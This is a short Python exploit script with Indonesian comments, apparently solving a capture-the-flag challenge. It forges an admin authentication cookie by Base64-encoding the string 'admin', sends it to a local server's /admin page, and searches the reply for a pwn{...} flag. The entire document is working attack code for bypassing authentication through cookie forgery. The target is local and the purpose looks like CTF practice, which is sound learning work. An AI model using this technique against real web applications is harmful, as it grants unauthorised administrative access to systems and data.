import requests
import base64
import re

# Sesuaikan port (tadi lu pake 1338)
URL = "http://localhost:1338/admin"

def exploit():
    print("[*] Target:", URL)
    
    # 1. Bikin Payload Cookie
    # String 'admin' kita encode ke Base64
    payload = base64.b64encode(b'admin').decode()
    print(f"[*] Forging Cookie: auth={payload}")
    
    # 2. Kirim Request dengan Cookie Palsu
    cookies = {'auth': payload}
    
    try:
        r = requests.get(URL, cookies=cookies)
        
        # 3. Cek Flag
        if r.status_code == 200:
            print("[+] Admin Access Granted!")
            # Cari format flag pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Masuk admin page, tapi regex flag gak nemu. Cek manual response:")
                print(r.text[:200])
        else:
            print(f"[-] Failed. Status Code: {r.status_code}")
            print("[-] Redirected to:", r.url)
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()
